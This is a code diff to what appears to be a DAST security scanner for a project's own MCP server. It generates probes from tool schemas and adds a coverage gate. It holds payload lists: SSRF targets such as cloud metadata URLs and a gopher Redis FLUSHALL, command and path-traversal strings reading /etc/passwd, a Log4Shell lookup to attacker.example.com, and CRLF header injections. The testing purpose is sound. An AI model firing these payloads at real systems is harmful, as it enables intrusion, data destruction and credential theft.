@@ -242,6 +242,211 @@ const mcpPost = (body) => probe('POST', '/mcp', {
   body,
 });
 
+// ── Schema-driven probe payload sets ─────────────────────────────────────────
+// These are consumed by buildProbesForTool(), which maps them onto parameters
+// by name and JSON Schema type. The classification logic here mirrors
+// src/tools/definitions.test.ts (Phase 4.1 contract test).
+
+const SSRF_TARGETS = [
+  { label: 'AWS_METADATA',      url: 'http://169.254.169.254/latest/meta-data/' },
+  { label: 'GCP_METADATA',      url: 'http://metadata.google.internal/computeMetadata/v1/' },
+  { label: 'LOCALHOST_ADMIN',   url: 'http://localhost/admin' },
+  { label: 'RFC1918_10X',       url: 'http://10.0.0.1/' },
+  { label: 'RFC1918_192168',    url: 'http://192.168.1.1/' },
+  { label: 'LINK_LOCAL',        url: 'http://169.254.0.1/' },
+  { label: 'FILE_PROTO',        url: 'file:///etc/passwd' },
+  { label: 'GOPHER_PROTO',      url: 'gopher://127.0.0.1:6379/_FLUSHALL%0D%0A' },
+];
+
+const INJECTION_PAYLOADS = [
+  { label: 'XSS',        value: '<script>alert(document.domain)</script>' },
+  { label: 'SSTI',       value: '{{7*7}}__${7*7}__<%=7*7%>' },
+  { label: 'CMD_INJECT', value: '; cat /etc/passwd #' },
+  { label: 'PATH_TRAV',  value: '../../../../../../etc/passwd' },
+  { label: 'NULL_BYTE',  value: 'test\x00injection' },
+  { label: 'LOG4SHELL',  value: '${jndi:ldap://attacker.example.com/a}' },
+];
+
+// Path traversal payloads for *Path / filename parameters (e.g. download_file.outputPath).
+// Detection: a successful ARBITRARY_WRITE finding fires when savedPath in the result matches
+// a sensitive absolute path — meaning the write bypassed any path restriction.
+const PATH_TRAVERSAL_PAYLOADS = [
+  { label: 'ABSOLUTE_SENSITIVE',  value: '/etc/passwd' },
+  { label: 'ABSOLUTE_APP_CODE',   value: '/app/dist/index.js' },
+  { label: 'RELATIVE_TRAVERSAL',  value: '../../../../etc/passwd' },
+  { label: 'ENCODED_TRAVERSAL',   value: '/tmp/..%2f..%2fetc%2fpasswd' },
+  { label: 'NULL_BYTE_TRAVERSAL', value: '/tmp/test\x00.pdf' },
+];
+
+// CRLF / header-injection payloads for z.record(string,string) header parameters.
+const CRLF_PAYLOADS = [
+  { label: 'CRLF_INJECT',   key: 'X-Injected',    value: 'test\r\nX-Injected-2: evil' },
+  { label: 'AUTH_FORWARD',  key: 'Authorization',  value: 'Bearer attacker-forwarded-token' },
+  { label: 'HOST_OVERRIDE', key: 'Host',           value: 'attacker.example.com' },
+];
+
+/**
+ * Map a JSON Schema property descriptor onto a payload class.
+ * Returns null for parameters with no known attack surface (enums, booleans, etc.)
+ * Mirrors the classification logic in src/tools/definitions.test.ts (Phase 4.1).
+ */
+function classifyParam(paramName, jsonSchema) {
+  const n = paramName.toLowerCase();
+  if (n === 'url' || n === 'urls') return 'ssrf';
+  if (n === 'outputpath' || n.endsWith('path') || n === 'filename') return 'path';
+  if (n === 'headers' && jsonSchema?.type === 'object') return 'headers';
+  if (n === 'query' || n === 'jobid') return 'injection';
+  return null;
+}
+
+/**
+ * Return a safe, benign default value for a required parameter that is NOT the
+ * one currently being probed. Uses values that reach tool handlers without
+ * meaningful side-effects (example.com is publicly routable; a nonexistent jobId
+ * returns a clean JSON-RPC error without DB side-effects).
+ */
+function safeDefaultArg(paramName, jsonSchema) {
+  const n = paramName.toLowerCase();
+  if (n === 'url')  return 'http://example.com/robots.txt';
+  if (n === 'urls') return ['http://example.com/robots.txt'];
+  if (n === 'outputpath' || n.endsWith('path')) return '/tmp/probe-safe-default';
+  if (n === 'jobid') return 'probe-nonexistent-job-safe';
+  if (jsonSchema?.type === 'string')  return 'probe-safe-string';
+  if (jsonSchema?.type === 'number' || jsonSchema?.type === 'integer') return 1;
+  if (jsonSchema?.type === 'boolean') return false;
+  if (jsonSchema?.type === 'array')   return [];
+  return undefined;
+}
+
+/**
+ * Generate all probe specs for a single tool from its JSON Schema (as returned
+ * by tools/list). Each spec carries enough information to build the MCP call and
+ * evaluate the response.
+ *
+ * Coverage contract: every tool that appears in tools/list must have at least
+ * one probe, OR appear in NO_ATTACK_SURFACE_TOOLS. The coverage gate below
+ * enforces this and exits 2 if it fails, converting "forgot to probe the new
+ * tool" from an invisible miss into a red scan.
+ */
+function buildProbesForTool(tool) {
+  const props    = tool.inputSchema?.properties ?? {};
+  const required = new Set(tool.inputSchema?.required ?? []);
+  const probes   = [];
+
+  for (const [paramName, paramSchema] of Object.entries(props)) {
+    const cls = classifyParam(paramName, paramSchema);
+    if (!cls) continue;
+
+    // Build a complete, valid argument object: safe defaults for all required
+    // params except the one being probed (which gets the attack payload).
+    const baseArgs = {};
+    for (const req of required) {
+      if (req === paramName) continue;
+      const val = safeDefaultArg(req, props[req]);
+      if (val !== undefined) baseArgs[req] = val;
+    }
+
+    let payloads;
+    if (cls === 'ssrf') {
+      payloads = SSRF_TARGETS.map(t => ({
+        label: t.label,
+        // Array-typed url params (e.g. fetch_urls.urls) need the URL wrapped
+        value: paramSchema.type === 'array' ? [t.url] : t.url,
+      }));
+    } else if (cls === 'path') {
+      payloads = PATH_TRAVERSAL_PAYLOADS;
+    } else if (cls === 'headers') {
+      payloads = CRLF_PAYLOADS.map(p => ({
+        label: p.label,
+        value: { [p.key]: p.value },
+      }));
+    } else {
+      // injection
+      payloads = INJECTION_PAYLOADS;
+    }
+
+    for (const p of payloads) {
+      probes.push({
+        toolName:     tool.name,
+        paramName,
+        payloadClass: cls,
+        label:        `${tool.name}.${paramName}/${p.label}`,
+        args:         { ...baseArgs, [paramName]: p.value },
+      });
+    }
+  }
+
+  return probes;
+}
+
+/**
+ * Evaluate a JSON-RPC response body for signs that an attack payload succeeded.
+ * Called AFTER isJsonRpcEnvelope() has confirmed the response reached a handler.
+ */
+function evaluateProbeResponse({ payloadClass, label, args, paramName }, r) {
+  const body = r.body;
+  const tag  = label.replace(/[^A-Z0-9]/gi, '_').toUpperCase();
+
+  if (payloadClass === 'ssrf') {
+    const hit = body.includes('ami-id') || body.includes('instance-type') ||
+                body.includes('project-id') || body.includes('computeMetadata') ||
+                body.includes('root:x:0:0');
+    hit
+      ? finding(probeFindings, 'CRITICAL', `SSRF_${tag}`,
+          `SSRF succeeded — internal resource accessed via ${label}`, body.slice(0, 300))
+      : pass(`SSRF blocked: ${label}`);
+
+  } else if (payloadClass === 'path') {
+    // For write-path tools (e.g. download_file), an ARBITRARY_WRITE finding fires
+    // when savedPath in a successful result is a sensitive absolute path.
+    const successfulSensitiveWrite =
+      body.includes('"savedPath"') && (
+        body.includes('"/etc/')   ||
+        body.includes('"/app/dist/') ||
+        body.includes('"/../')
+      );
+    const lfi     = body.includes('root:x:0:0') || body.includes('/bin/bash');
+    const appCode = body.includes('__esModule') || body.includes('Object.defineProperty(exports');
+    successfulSensitiveWrite
+      ? finding(probeFindings, 'HIGH', `ARBITRARY_WRITE_${tag}`,
+          `Arbitrary file write succeeded — probe path accepted outside allowed directories`, body.slice(0, 300))
+      : lfi
+        ? finding(probeFindings, 'CRITICAL', `PATH_TRAVERSAL_LFI_${tag}`,
+            `Path traversal succeeded — /etc/passwd content in response`, body.slice(0, 300))
+        : appCode
+          ? finding(probeFindings, 'HIGH', `PATH_TRAVERSAL_APP_CODE_${tag}`,
+              `Path traversal may have returned compiled application code`, body.slice(0, 300))
+          : pass(`Path traversal blocked: ${label}`);
+
+  } else if (payloadClass === 'headers') {
+    // CRLF injection: the injected trailer header appears in the response
+    const crlf = body.includes('X-Injected-2:');
+    crlf
+      ? finding(probeFindings, 'HIGH', `CRLF_INJECT_${tag}`,
+          `CRLF injection succeeded — injected header reflected in response`, body.slice(0, 300))
+      : pass(`Header injection blocked: ${label}`);
+
+  } else {
+    // injection (query strings, jobId values, etc.)
+    const reflected = body.includes('<script>') && body.includes('alert(');
+    const lfi       = body.includes('root:x:0:0') || body.includes('/bin/bash');
+    const ssti      = typeof args[paramName] === 'string' &&
+                      args[paramName].includes('7*7') &&
+                      body.includes('49') &&
+                      !body.includes('7*7');
+    reflected
+      ? finding(probeFindings, 'HIGH',     `XSS_REFLECTED_${tag}`,
+          'XSS payload reflected unescaped', body.slice(0, 300))
+      : lfi
+        ? finding(probeFindings, 'CRITICAL', `LFI_${tag}`,
+            'Local file inclusion succeeded', body.slice(0, 300))
+        : ssti
+          ? finding(probeFindings, 'HIGH',   `SSTI_${tag}`,
+              'Server-side template injection', body.slice(0, 300))
+          : pass(`Injection safe: ${label}`);
+  }
+}
+
 // 2.1 Authentication enforcement
 console.log('[DAST] 2.1 Authentication enforcement');
 if (TOKEN) {
@@ -270,67 +475,77 @@ for (const path of ['/healthz', '/readyz']) {
         `${path} → ${r.status}: Kubernetes liveness/readiness probes will fail`);
 }
 
-// 2.2 SSRF via tool arguments
-console.log('[DAST] 2.2 SSRF via tool arguments');
-const ssrfTargets = [
-  { label: 'AWS_METADATA',      url: 'http://169.254.169.254/latest/meta-data/' },
-  { label: 'GCP_METADATA',      url: 'http://metadata.google.internal/computeMetadata/v1/' },
-  { label: 'LOCALHOST_ADMIN',   url: 'http://localhost/admin' },
-  { label: 'RFC1918_10X',       url: 'http://10.0.0.1/' },
-  { label: 'RFC1918_192168',    url: 'http://192.168.1.1/' },
-  { label: 'LINK_LOCAL',        url: 'http://169.254.0.1/' },
-];
-for (const { label, url } of ssrfTargets) {
-  const r = await mcpPost({
-    jsonrpc: '2.0', method: 'tools/call', id: 1,
-    params: { name: 'fetch_url', arguments: { url } },
-  });
-  toolCallProbeStatuses.push(r.status);
-  if (!isJsonRpcEnvelope(r.body)) {
-    finding(probeFindings, 'CRITICAL', `PROBE_NO_ENVELOPE_SSRF_${label}`,
-      `SSRF probe (${label}) got no JSON-RPC envelope — probe did not reach the tool handler`,
-      `Status: ${r.status}  Body: ${r.body.slice(0, 200)}`);
-    continue;
+// 2.2 Schema-driven probes — generated from the live tools/list response
+//
+// Payload classes applied by parameter name and JSON Schema type:
+//   ssrf      → url / urls parameters
+//   path      → *Path / filename parameters (e.g. download_file.outputPath)
+//   headers   → z.record(string,string) header maps (e.g. fetch_url.headers)
+//   injection → query / jobId string parameters
+//
+// Coverage gate: any tool from tools/list with zero generated probes that is
+// NOT in NO_ATTACK_SURFACE_TOOLS causes the scan to exit 2. This converts
+// "forgot to probe the new tool" into an explicit red scan — the same guarantee
+// the positive control provides for the harness transport.
+//
+// Mirrors the contract test in src/tools/definitions.test.ts (Phase 4.1).
+
+// Tools with no attack-relevant parameters — explicitly acknowledged, not silent gaps.
+const NO_ATTACK_SURFACE_TOOLS = new Set(['health_check', 'crawl_list']);
+
+const allGeneratedProbes = availableTools.flatMap(t => buildProbesForTool(t));
+
+// Coverage gate check
+const probeCountPerTool = new Map(availableTools.map(t => [t.name, 0]));
+for (const p of allGeneratedProbes) {
+  probeCountPerTool.set(p.toolName, (probeCountPerTool.get(p.toolName) ?? 0) + 1);
+}
+const uncoveredTools = availableTools.filter(t =>
+  probeCountPerTool.get(t.name) === 0 && !NO_ATTACK_SURFACE_TOOLS.has(t.name)
+);
+if (uncoveredTools.length > 0) {
+  for (const t of uncoveredTools) {
+    finding(probeFindings, 'CRITICAL',
+      `PROBE_COVERAGE_MISSING_${t.name.replace(/[^A-Z0-9]/gi, '_').toUpperCase()}`,
+      `Tool "${t.name}" has zero generated probes — add probe coverage in scripts/scan-dast.mjs`,
+      `Input schema params: ${Object.keys(t.inputSchema?.properties ?? {}).join(', ') || '(none)'}`);
   }
-  const hit = r.body.includes('ami-id') || r.body.includes('instance-type') ||
-              r.body.includes('project-id') || r.body.includes('computeMetadata');
-  if (hit) {
-    finding(probeFindings, 'CRITICAL', `SSRF_${label}`,
-      `SSRF succeeded — internal metadata retrieved via ${url}`, r.body.slice(0, 300));
-  } else {
-    pass(`SSRF blocked: ${label}`);
-  }
+  const names = uncoveredTools.map(t => t.name).join(', ');
+  console.error(`[DAST] Coverage gate FAIL: ${uncoveredTools.length} tool(s) have zero probes: ${names}`);
+  writeFileSync(`${OUT}/dast-probes.json`, JSON.stringify({
+    target: BASE, zapSkipped: args['skip-zap'], probeFindings, probesPassed, coverageGateFailure: true,
+  }, null, 2));
+  process.exit(2);
 }
 
-// 2.3 Injection via web_search query
-console.log('[DAST] 2.3 Injection via tool arguments');
-const injections = [
-  { label: 'XSS',          payload: '<script>alert(document.domain)</script>' },
-  { label: 'SSTI',         payload: '{{7*7}}__${7*7}__<%=7*7%>' },
-  { label: 'CMD_INJECT',   payload: '; cat /etc/passwd #' },
-  { label: 'PATH_TRAV',    payload: '../../../../../../etc/passwd' },
-  { label: 'NULL_BYTE',    payload: 'test\x00injection' },
-  { label: 'LOG4SHELL',    payload: '${jndi:ldap://attacker.example.com/a}' },
-];
-for (const { label, payload } of injections) {
-  const r = await mcpPost({
-    jsonrpc: '2.0', method: 'tools/call', id: 1,
-    params: { name: 'web_search', arguments: { query: payload } },
-  });
-  toolCallProbeStatuses.push(r.status);
-  if (!isJsonRpcEnvelope(r.body)) {
-    finding(probeFindings, 'CRITICAL', `PROBE_NO_ENVELOPE_INJ_${label}`,
-      `Injection probe (${label}) got no JSON-RPC envelope — probe did not reach the tool handler`,
-      `Status: ${r.status}  Body: ${r.body.slice(0, 200)}`);
-    continue;
+// Group by tool for readable progress logging
+const probesByTool = {};
+for (const p of allGeneratedProbes) {
+  (probesByTool[p.toolName] ??= []).push(p);
+}
+const whitelisted = [...NO_ATTACK_SURFACE_TOOLS].filter(n => availableTools.some(t => t.name === n));
+console.log(`[DAST] 2.2 Coverage gate passed — ${availableTools.length} tools, ${allGeneratedProbes.length} generated probes`);
+if (whitelisted.length) console.log(`       No-attack-surface whitelist: ${whitelisted.join(', ')}`);
+console.log('');
+
+for (const [toolName, toolProbes] of Object.entries(probesByTool)) {
+  const classes = [...new Set(toolProbes.map(p => p.payloadClass))].join(', ');
+  console.log(`[DAST] 2.2 ${toolName}: ${toolProbes.length} probe(s) [${classes}]`);
+  for (const probeSpec of toolProbes) {
+    const r = await mcpPost({
+      jsonrpc: '2.0', method: 'tools/call', id: 1,
+      params: { name: probeSpec.toolName, arguments: probeSpec.args },
+    });
+    toolCallProbeStatuses.push(r.status);
+    if (!isJsonRpcEnvelope(r.body)) {
+      finding(probeFindings, 'CRITICAL',
+        `PROBE_NO_ENVELOPE_${probeSpec.label.replace(/[^A-Z0-9]/gi, '_').toUpperCase()}`,
+        `Probe ${probeSpec.label} got no JSON-RPC envelope — did not reach the tool handler`,
+        `Status: ${r.status}  Body: ${r.body.slice(0, 200)}`);
+      continue;
+    }
+    evaluateProbeResponse(probeSpec, r);
   }
-  const reflected = r.body.includes('<script>') && r.body.includes('alert(');
-  const lfi       = r.body.includes('root:x:0:0') || r.body.includes('/bin/bash');
-  const ssti      = payload.includes('7*7') && r.body.includes('49') && !r.body.includes('7*7');
-  if (reflected) finding(probeFindings, 'HIGH',     `XSS_REFLECTED_${label}`,    'XSS payload reflected unescaped',  r.body.slice(0, 300));
-  else if (lfi)  finding(probeFindings, 'CRITICAL', `LFI_${label}`,              'Local file inclusion succeeded',   r.body.slice(0, 300));
-  else if (ssti) finding(probeFindings, 'HIGH',     `SSTI_${label}`,             'Server-side template injection',   r.body.slice(0, 300));
-  else           pass(`Injection safe: ${label}`);
 }
 
 // Uniform-rejection guard: if every tool-call probe returned the same non-200
@@ -356,8 +571,8 @@ if (toolCallProbeStatuses.length > 0) {
   }
 }
 
-// 2.4 Error disclosure
-console.log('[DAST] 2.4 Error disclosure');
+// 2.3 Error disclosure
+console.log('[DAST] 2.3 Error disclosure');
 const malformed = await probe('POST', '/mcp', { headers: authHeaders, body: '{"broken":' });
 if (/at \w+\s*\(|node_modules\//.test(malformed.body)) {
   finding(probeFindings, 'MODERATE', 'ERROR_STACK_LEAK', 'Stack trace visible in error response', malformed.body.slice(0, 400));
@@ -370,8 +585,8 @@ if (/\/home\/|\/app\/|\/Users\//.test(malformed.body)) {
   pass('Internal paths not exposed in error responses');
 }
 
-// 2.5 HTTP method enforcement
-console.log('[DAST] 2.5 HTTP method enforcement');
+// 2.4 HTTP method enforcement
+console.log('[DAST] 2.4 HTTP method enforcement');
 for (const method of ['GET', 'PUT', 'PATCH']) {
   const r = await probe(method, '/mcp', { headers: authHeaders });
   [405, 404, 400].includes(r.status)
@@ -390,8 +605,8 @@ deleteRes.status === 200
   : finding(probeFindings, 'LOW', 'MCP_DELETE_UNEXPECTED',
       `DELETE /mcp returned ${deleteRes.status} — expected 200 per MCP session teardown spec`);
 
-// 2.6 CORS
-console.log('[DAST] 2.6 CORS misconfiguration');
+// 2.5 CORS
+console.log('[DAST] 2.5 CORS misconfiguration');
 const corsRes = await probe('OPTIONS', '/mcp', {
   headers: {
     ...authHeaders,
